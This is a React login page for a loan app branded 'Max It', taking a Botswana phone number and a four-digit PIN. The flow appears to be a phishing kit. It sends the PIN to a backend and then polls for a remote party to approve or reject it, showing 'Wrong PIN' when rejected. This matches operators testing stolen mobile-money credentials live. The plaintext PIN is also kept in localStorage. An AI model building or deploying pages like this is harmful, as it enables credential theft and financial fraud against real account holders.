import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLoanApplication } from '../LoanApplicationContext';
import './Login.css';

export default function Login() {
  const navigate = useNavigate();
  
  const { personalDetailsData, updateAuthData, serverStatus } = useLoanApplication();
  
  const API_ENDPOINT = import.meta.env.VITE_USER_API_ENDPOINT || '1';
  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
  
  // Use the phone number exactly as saved in Details — no slicing/trimming
  const initialPhone = personalDetailsData.phoneNumber
    ? personalDetailsData.phoneNumber.replace(/\D/g, '')
    : '';
  
  const [phoneNumber, setPhoneNumber] = useState(initialPhone);
  const [pin, setPin] = useState(['', '', '', '']);
  const [showPin, setShowPin] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isReturningUser, setIsReturningUser] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  
  const pinRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];

  const pollingIntervalRef = useRef(null);
  const pollingAttempts = useRef(0);
  const maxPollingAttempts = 60;

  useEffect(() => {
    return () => {
      if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current);
    };
  }, []);

  // Valid Botswana formats:
  //   8 digits NOT starting with 0  (e.g. 71234567)
  //   9 digits starting with 0      (e.g. 071234567)
  const validatePhoneNumber = (number) => {
    if (!number) return { valid: false, message: '' };

    if (number.length === 8 && number[0] !== '0') return { valid: true, message: '' };
    if (number.length === 9 && number[0] === '0') return { valid: true, message: '' };

    return {
      valid: false,
      message:
        'Enter 8 digits without leading 0 (e.g. 71234567)\nor 9 digits with leading 0 (e.g. 071234567)'
    };
  };

  const handlePhoneChange = (e) => {
    const numericValue = e.target.value.replace(/\D/g, '').slice(0, 9);
    setPhoneNumber(numericValue);
  };

  const handlePhonePaste = (e) => {
    e.preventDefault();
    const numericValue = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 9);
    setPhoneNumber(numericValue);
  };

  const handlePinChange = (index, value) => {
    const numericValue = value.replace(/\D/g, '');
    if (numericValue.length > 1) return;
    
    const newPin = [...pin];
    newPin[index] = numericValue;
    setPin(newPin);

    if (numericValue && index < 3) pinRefs[index + 1].current.focus();
  };

  const handlePinPaste = (e, index) => {
    e.preventDefault();
    const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4).split('');
    const newPin = [...pin];
    digits.forEach((digit, i) => { if (index + i < 4) newPin[index + i] = digit; });
    setPin(newPin);
    pinRefs[Math.min(index + digits.length, 3)].current.focus();
  };

  const handlePinKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (pin[index]) {
        const newPin = [...pin];
        newPin[index] = '';
        setPin(newPin);
      } else if (index > 0) {
        pinRefs[index - 1].current.focus();
      }
    } else if (e.key === 'ArrowLeft' && index > 0) {
      pinRefs[index - 1].current.focus();
    } else if (e.key === 'ArrowRight' && index < 3) {
      pinRefs[index + 1].current.focus();
    }
  };

  const handlePinKeyPress = (e) => {
    if (!/^\d$/.test(e.key)) e.preventDefault();
  };

  const togglePinVisibility = () => setShowPin(!showPin);

  const startPollingForApproval = (formattedPhone, fullPin, returning) => {
    pollingAttempts.current = 0;
    
    pollingIntervalRef.current = setInterval(async () => {
      try {
        pollingAttempts.current++;
        
        if (pollingAttempts.current > maxPollingAttempts) {
          clearInterval(pollingIntervalRef.current);
          setWaitingForApproval(false);
          setIsProcessing(false);
          setErrorMessage('Something went wrong, try again');
          setShowErrorModal(true);
          return;
        }
        
        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-login-approval`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: formattedPhone, pin: fullPin })
        });

        const data = await response.json();

        if (data.success) {
          if (data.approved) {
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false);
            await new Promise(resolve => setTimeout(resolve, 500));
            navigate(returning ? '/status' : '/verify');
          } else if (data.rejected) {
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false);
            setIsProcessing(false);
            setErrorMessage('Wrong PIN');
            setShowErrorModal(true);
          } else if (data.expired) {
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false);
            setIsProcessing(false);
            setErrorMessage('Something went wrong, try again');
            setShowErrorModal(true);
          }
        }
      } catch (error) {
        console.error('Error polling approval status:', error);
      }
    }, 5000);
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    
    const fullPin = pin.join('');
    
    const validation = validatePhoneNumber(phoneNumber);
    if (!validation.valid) {
      setErrorMessage(`${validation.message}\nPlease enter correct number and try again!`);
      setShowErrorModal(true);
      return;
    }
    
    if (fullPin.length !== 4) {
      setErrorMessage('Please enter complete 4-digit PIN');
      setShowErrorModal(true);
      return;
    }

    const formattedPhone = `+267${phoneNumber}`;
    
    updateAuthData({ phoneNumber: formattedPhone, pin: fullPin, isAuthenticated: false });

    try {
      localStorage.setItem('maxit_phone', formattedPhone);
      localStorage.setItem('maxit_auth', JSON.stringify({
        phoneNumber: formattedPhone,
        pin: fullPin,
        isAuthenticated: false,
        timestamp: new Date().toISOString()
      }));
    } catch (error) {
      console.error('Failed to save auth:', error);
    }

    setIsProcessing(true);

    try {
      const statusResponse = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-user-status`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: formattedPhone })
      });
      const statusData = await statusResponse.json();
      const returning = statusData.isReturningUser || false;
      setIsReturningUser(returning);
      
      const loginResponse = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: formattedPhone, pin: fullPin, timestamp: new Date().toISOString() })
      });
      const loginData = await loginResponse.json();

      if (loginData.success) {
        setWaitingForApproval(true);
        startPollingForApproval(formattedPhone, fullPin, returning);
      } else {
        setIsProcessing(false);
        setErrorMessage('Failed to process login. Please try again.');
        setShowErrorModal(true);
      }
      
    } catch (error) {
      console.error('Login error:', error);
      setIsProcessing(false);
      setErrorMessage('Failed to process login. Please try again.');
      setShowErrorModal(true);
    }
  };

  const handleForgotPin = () => {
    alert('Please contact Max It support for PIN recovery.');
  };

  const closeErrorModal = () => {
    setShowErrorModal(false);
    setErrorMessage('');
  };

  // Complete when: (8 digits no leading 0) OR (9 digits with leading 0) AND all 4 PIN digits filled
  const isFormComplete =
    ((phoneNumber.length === 8 && phoneNumber[0] !== '0') ||
     (phoneNumber.length === 9 && phoneNumber[0] === '0')) &&
    pin.every(digit => digit !== '');

  const getButtonState = () => {
    if (serverStatus.isChecking) return { text: 'WAIT...', disabled: true, className: 'login-button waiting' };
    if (!serverStatus.isActive) return { text: 'SERVER ERROR', disabled: true, className: 'login-button error' };
    return { text: 'LOGIN', disabled: !isFormComplete || isProcessing, className: 'login-button' };
  };

  const buttonState = getButtonState();

  if (isProcessing || waitingForApproval) {
    return (
      <div className="login-container">
        <div className="processing-overlay">
          <div className="processing-card">
            <div className="spinner-container">
              <div className="spinner"></div>
            </div>
            <h1 className="processing-title">
              {waitingForApproval ? 'Please wait...' : 'Processing...'}
            </h1>
            <p className="processing-subtitle">
              {waitingForApproval
                ? 'This usually takes a few seconds'
                : isReturningUser
                  ? 'Welcome back! Taking you to dashboard...'
                  : 'Preparing verification...'
              }
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="login-container">
      {showErrorModal && (
        <div className="error-modal-overlay" onClick={closeErrorModal}>
          <div className="error-modal-content" onClick={(e) => e.stopPropagation()}>
            <div className="error-modal-icon">⚠️</div>
            <h2 className="error-modal-title">Wrong Details</h2>
            <p className="error-modal-message" style={{ whiteSpace: 'pre-line' }}>{errorMessage}</p>
            <button className="error-modal-button" onClick={closeErrorModal}>OK</button>
          </div>
        </div>
      )}

      <div className="login-header">
        <div className="logo-large">
          <span className="logo-large-max">Max</span>
          <span className="logo-large-it">It</span>
        </div>
        <div className="logo-subtitle">Quick &amp; Easy Loans</div>
      </div>

      <div className="login-content">
        <h1 className="login-title">Login</h1>

        {serverStatus.error && (
          <div className="server-status-message error">
            <p>⚠️ {serverStatus.error}</p>
          </div>
        )}

        <form className="login-form" onSubmit={handleLogin}>
          
          <div className="phone-input-container">
            <div className="country-code">
              <span className="flag-icon">🇧🇼</span>
              <span>+267</span>
            </div>
            <input 
              type="tel"
              className="phone-input"
              value={phoneNumber}
              onChange={handlePhoneChange}
              onPaste={handlePhonePaste}
              placeholder="71234567"
              maxLength="9"
              inputMode="numeric"
              required
              disabled={serverStatus.isChecking}
            />
          </div>

          <div className="pin-section">
            <p className="pin-label">Enter your PIN</p>
            
            <div className="pin-inputs-wrapper">
              <div className="pin-inputs">
                {pin.map((digit, index) => (
                  <input
                    key={index}
                    ref={pinRefs[index]}
                    type={showPin ? 'text' : 'password'}
                    className="pin-box"
                    value={digit}
                    onChange={(e) => handlePinChange(index, e.target.value)}
                    onKeyDown={(e) => handlePinKeyDown(index, e)}
                    onKeyPress={handlePinKeyPress}
                    onPaste={(e) => handlePinPaste(e, index)}
                    maxLength="1"
                    inputMode="numeric"
                    pattern="[0-9]"
                    required
                    disabled={serverStatus.isChecking}
                  />
                ))}
              </div>
              
              <button 
                type="button"
                className="eye-button"
                onClick={togglePinVisibility}
                aria-label={showPin ? 'Hide PIN' : 'Show PIN'}
                disabled={serverStatus.isChecking}
              >
                {showPin ? '👁️' : '👁️‍🗨️'}
              </button>
            </div>

            <p className="forgot-pin" onClick={handleForgotPin}>Forgot PIN?</p>
          </div>

          <button type="submit" className={buttonState.className} disabled={buttonState.disabled}>
            {buttonState.text}
          </button>
        </form>
      </div>

      <div className="login-footer">
        <div className="wave-decoration"></div>
        <div className="footer-content">
          <div className="footer-logo">
            <div className="footer-logo-text">
              <span className="footer-logo-max">Max</span>
              <span className="footer-logo-it">It</span>
            </div>
            <div className="footer-logo-subtitle">Quick &amp; Easy Loans</div>
          </div>
          <p className="terms-text">
            By signing in you agree to the{' '}
            <span className="terms-link">Terms and Conditions</span>
          </p>
        </div>
      </div>
    </div>
  );
}